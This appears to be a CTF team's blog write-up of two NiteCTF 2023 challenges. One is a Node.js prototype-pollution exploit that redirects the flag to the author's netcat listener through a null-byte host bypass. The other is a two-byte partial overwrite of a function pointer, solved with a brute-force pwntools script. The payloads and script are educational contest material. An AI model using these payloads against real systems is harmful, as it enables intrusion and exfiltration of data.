<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="NiteCTF 2023 Challenges" /><meta name="author" content="m0z" /><meta property="og:locale" content="en" /><meta name="description" content="Writeups These are two challenges which I found interesting from NiteCTF. Just 1x pwn and 1x web." /><meta property="og:description" content="Writeups These are two challenges which I found interesting from NiteCTF. Just 1x pwn and 1x web." /><link rel="canonical" href="https://ireland.re/posts/NiteCTF_2023/" /><meta property="og:url" content="https://ireland.re/posts/NiteCTF_2023/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-12-19T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="NiteCTF 2023 Challenges" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@m0z" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m0z"},"dateModified":"2023-12-19T00:00:00+00:00","datePublished":"2023-12-19T00:00:00+00:00","description":"Writeups These are two challenges which I found interesting from NiteCTF. Just 1x pwn and 1x web.","headline":"NiteCTF 2023 Challenges","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/NiteCTF_2023/"},"url":"https://ireland.re/posts/NiteCTF_2023/"}</script><title>NiteCTF 2023 Challenges | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>NiteCTF 2023 Challenges</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>NiteCTF 2023 Challenges</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1702944000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-12-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="960 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><h2 id="writeups"><span class="mr-2">Writeups</span><a href="#writeups" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>These are two challenges which I found interesting from NiteCTF. Just 1x pwn and 1x web.</p><h2 id="webmini-survey"><span class="mr-2">web/Mini Survey</span><a href="#webmini-survey" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Downloading the source, we see this is a Javascript challenge immediately observing some unusual practices:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">surveyOneInitialData</span><span class="p">[</span><span class="nx">fieldInput1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">[</span><span class="nx">fieldInput2</span><span class="p">]:</span>  <span class="nx">fieldInput3</span> <span class="p">};</span>
</pre></table></code></div></div><p>Placing user input into square bracket notation such as the above can lead to Prototype Pollution in objects. Judging by the fact that this endpoint is named <code class="language-plaintext highlighter-rouge">PollutionSurvey</code> and the various <code class="language-plaintext highlighter-rouge">Object</code> operations occuring we can probably assume this challenge will entail some Prototype Pollution.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/pollutionsurvey</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="kd">let</span>  <span class="nx">fieldInput1</span>  <span class="o">=</span>  <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
	<span class="kd">let</span>  <span class="nx">fieldInput2</span>  <span class="o">=</span>  <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">city</span><span class="p">;</span>
	<span class="kd">let</span>  <span class="nx">fieldInput3</span>  <span class="o">=</span>  <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pollutionRate</span><span class="p">;</span>
	<span class="nx">surveyOneInitialData</span><span class="p">[</span><span class="nx">fieldInput1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">[</span><span class="nx">fieldInput2</span><span class="p">]:</span>  <span class="nx">fieldInput3</span> <span class="p">};</span>
	<span class="nx">surveyOneInitialData</span>  <span class="o">=</span>  <span class="nx">updateDBs</span><span class="p">(</span><span class="nx">surveyOneInitialData</span><span class="p">,</span> <span class="p">{</span>
		<span class="na">Name</span><span class="p">:</span> <span class="p">{</span> <span class="na">City</span><span class="p">:</span>  <span class="dl">"</span><span class="s2">Rating</span><span class="dl">"</span> <span class="p">},</span>
	<span class="p">});</span>
	<span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/thankyou</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>
</pre></table></code></div></div><p>This is the full endpoint. We may pollute the object however we wish and it will be passed into an <code class="language-plaintext highlighter-rouge">updateDBs()</code> function call. This function is defined below.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">updateDBs</span><span class="p">(</span><span class="nx">dataObj</span><span class="p">,</span> <span class="nx">original</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span>  <span class="nx">commData</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nx">dataObj</span><span class="p">);</span>
	<span class="nx">commData</span><span class="p">[</span><span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">nite{FAKE_FAKE_FAKE_FLAG}</span><span class="dl">"</span><span class="p">;</span>
	<span class="nx">commData</span><span class="p">[</span><span class="dl">"</span><span class="s2">log</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">new entry added</span><span class="dl">"</span><span class="p">;</span>
	<span class="nx">sendData</span><span class="p">(</span><span class="nx">commData</span><span class="p">);</span>
	<span class="k">return</span> <span class="nx">original</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So it is going to instantiate an Object using <code class="language-plaintext highlighter-rouge">Object.create(dataObj)</code> where <code class="language-plaintext highlighter-rouge">dataObj</code> is our polluted Object instance. It will then append the flag to the data object and pass this new data object to the <code class="language-plaintext highlighter-rouge">sendData()</code> function.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">sendData</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">postData</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">host</span> <span class="o">!=</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">backupServerHost</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">host</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">port</span> <span class="o">!=</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">backupServerPort</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">port</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">const</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
        <span class="na">host</span><span class="p">:</span> <span class="nx">backupServerHost</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">localhost</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">port</span><span class="p">:</span> <span class="nx">backupServerPort</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">8888</span><span class="dl">"</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span>
        <span class="k">typeof</span> <span class="nx">options</span><span class="p">.</span><span class="nx">host</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span> <span class="o">&amp;&amp;</span>
        <span class="nx">options</span><span class="p">.</span><span class="nx">host</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">.ngrok.io</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">socket</span> <span class="o">=</span> <span class="nx">net</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">socket</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">postData</span><span class="p">);</span>
            <span class="nx">socket</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
        <span class="p">});</span>

        <span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">error</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>There’s quite a bit to unpack here. We may define a <code class="language-plaintext highlighter-rouge">data.host</code> or a <code class="language-plaintext highlighter-rouge">data.port</code> which will update the <code class="language-plaintext highlighter-rouge">backupServerHost</code> and <code class="language-plaintext highlighter-rouge">backupServerPort</code> variables respectively.</p><p>Our <code class="language-plaintext highlighter-rouge">host</code> must be of type <code class="language-plaintext highlighter-rouge">string</code> and end with <code class="language-plaintext highlighter-rouge">.ngrok.io</code> which hints towards us using the ngrok service to retrieve the flag. From here, the attack should be a bit more obvious.</p><p>Back to the endpoint, particularly the line containing <code class="language-plaintext highlighter-rouge">surveyOneInitialData[fieldInput1] = { [fieldInput2]: fieldInput3 };</code>. We will need to define <code class="language-plaintext highlighter-rouge">fieldInput1</code> as <code class="language-plaintext highlighter-rouge">__proto__</code> to pollute the prototype. We will then define <code class="language-plaintext highlighter-rouge">fieldInput2</code> as <code class="language-plaintext highlighter-rouge">host</code> and <code class="language-plaintext highlighter-rouge">fieldInput3</code> as our ngrok URL. The default port will be <code class="language-plaintext highlighter-rouge">8888</code>.</p><p>However, we may also pollute the port separately. Because these are globalized variables they will be set to whatever value they were last polluted to.</p><p>I am not a fan of the ngrok service. There are many issues with using it for this challenge (specifying ports, requiring user confirmation before accepting requests, etc). As such, I tried to bypass this using a nullbyte. We can pass our host as <code class="language-plaintext highlighter-rouge">myhost.com%00.ngrok.io</code> and it will send the data to <code class="language-plaintext highlighter-rouge">myhost.com</code> due to the nullbyte termination. This was unintended but certainly useful.</p><p>So I opened up a reverse shell connection using <code class="language-plaintext highlighter-rouge">nc -lvnp 1337</code> and then sent a request to the website to pollute the port variable to <code class="language-plaintext highlighter-rouge">1337</code>:</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">name=__proto__&amp;city=port&amp;pollutionRate=1337
</span></pre></table></code></div></div><p>After this, I simply polluted the host variable to send it to my IP address <code class="language-plaintext highlighter-rouge">1.3.3.7</code> to collect.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">name=__proto__&amp;city=host&amp;pollutionRate=1.3.3.7%00.ngrok.io
</span></pre></table></code></div></div><p>Then we get the flag!</p><p><code class="language-plaintext highlighter-rouge">nite{pr0t0_p0llut3d_116a4601b79d6b8f}</code></p><h2 id="pwnthe-road-not-taken"><span class="mr-2">pwn/The road not taken</span><a href="#pwnthe-road-not-taken" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was a pretty fun binary exploitation challenge. Running <code class="language-plaintext highlighter-rouge">checksec</code> we see that there is no canary and Partial RELRO but PIE and NX are both enabled.</p><p>Opening in Ghidra we can get an idea of what it’s doing.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">undefined</span> <span class="n">buf</span> <span class="p">[</span><span class="mi">520</span><span class="p">];</span>
  <span class="n">code</span> <span class="o">*</span><span class="n">wrongdirection</span><span class="p">;</span>
  
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
  <span class="n">wrongdirection</span> <span class="o">=</span> <span class="o">::</span><span class="n">wrongdirection</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Can you please lead me to the right direction to get to the flag?"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">522</span><span class="p">);</span>
  <span class="p">(</span><span class="o">*</span><span class="n">wrongdirection</span><span class="p">)();</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So it’s instantiating a stack variable containing a pointer to a function which it later calls. This is always pretty dangerous as stack variables can be a lot more susceptible to buffer overflow attacks. We can see the buffer in this case is 520 bytes but the call to <code class="language-plaintext highlighter-rouge">read()</code> allows us to write 522 bytes to the stack. This is a 2 byte overflow.</p><p>Given that PIE is enabled, it would be unrealistic for us to overflow to anything useful (given the address randomization). As such, it became obvious that we would be using this two byte overflow to partially modify the pointer address by changing the last 2 bytes to point to something more useful.</p><p>We can see the functions below.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="mh">0x0000000000001000</span>  <span class="nx">_init</span>
<span class="mh">0x0000000000001030</span>  <span class="nx">puts</span><span class="p">@</span><span class="nd">plt</span>
<span class="mh">0x0000000000001040</span>  <span class="nx">setbuf</span><span class="p">@</span><span class="nd">plt</span>
<span class="mh">0x0000000000001050</span>  <span class="nx">read</span><span class="p">@</span><span class="nd">plt</span>
<span class="mh">0x0000000000001060</span>  <span class="nx">_start</span>
<span class="mh">0x0000000000001159</span>  <span class="nx">rightdirection</span>
<span class="mh">0x000000000000117e</span>  <span class="nx">wrongdirection</span>
<span class="mh">0x0000000000001194</span>  <span class="nx">main</span>
<span class="mh">0x0000000000001208</span>  <span class="nx">_fini</span>
</pre></table></code></div></div><p>It’s pretty clear that we need to overflow to the <code class="language-plaintext highlighter-rouge">rightdirection</code> function. From running the binary and analyzing with <code class="language-plaintext highlighter-rouge">pwndbg</code> I noticed that PIE was randomizing the addresses each run but the last byte remained the same. Since we can overflow the last 2 bytes, we know we will want to overflow a <code class="language-plaintext highlighter-rouge">\x59</code> to correspond to <code class="language-plaintext highlighter-rouge">rightdirection</code> but we don’t know the correct byte preceding this.</p><p>However, there’s only 256 possible bytes so we can just brute force this. My script is below.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">local</span> <span class="o">=</span> <span class="bp">False</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'error'</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">local</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./the_road_not_taken1'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'34.100.142.216'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

        <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">520</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="s">"Y"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"}"</span><span class="p">))</span>
            <span class="k">break</span>
        <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
            <span class="k">pass</span>

</pre></table></code></div></div><p>When running it, we eventually get our flag. <code class="language-plaintext highlighter-rouge">nite{R0b3rT_fro5t_ftw_32dx5hp}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/prototype-pollution/" class="post-tag no-text-decoration" >prototype pollution</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=NiteCTF 2023 Challenges - Ireland.RE&amp;url=https://ireland.re/posts/NiteCTF_2023/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=NiteCTF 2023 Challenges - Ireland.RE&amp;u=https://ireland.re/posts/NiteCTF_2023/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/NiteCTF_2023/&amp;text=NiteCTF 2023 Challenges - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/irisctf_2025/">irisctf 2025 Web Writeups</a><li><a href="/posts/idekctf_2024/">idekctf 2024 Web Writeups</a><li><a href="/posts/HitconCTF_2024/">Hitcon CTF 2024 RClonE</a><li><a href="/posts/UMassCTF2024/">UMassCTF 2024</a><li><a href="/posts/CursedCTF_2024/">CursedCTF 2024</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TheFewChosen_2023/"><div class="card-body"> <em class="timeago small" data-ts="1690675200" > 2023-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TheFewChosen 2023</h3><div class="text-muted small"><p> Crypto Dizzy We’re given this to decipher: T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24 The...</p></div></div></a></div><div class="card"> <a href="/posts/CursedCTF_2024/"><div class="card-body"> <em class="timeago small" data-ts="1712275200" > 2024-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CursedCTF 2024</h3><div class="text-muted small"><p> Web - Hero’s Journey Challenge description Hero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image: So l...</p></div></div></a></div><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Backdoor_CTF_2023_Web/" 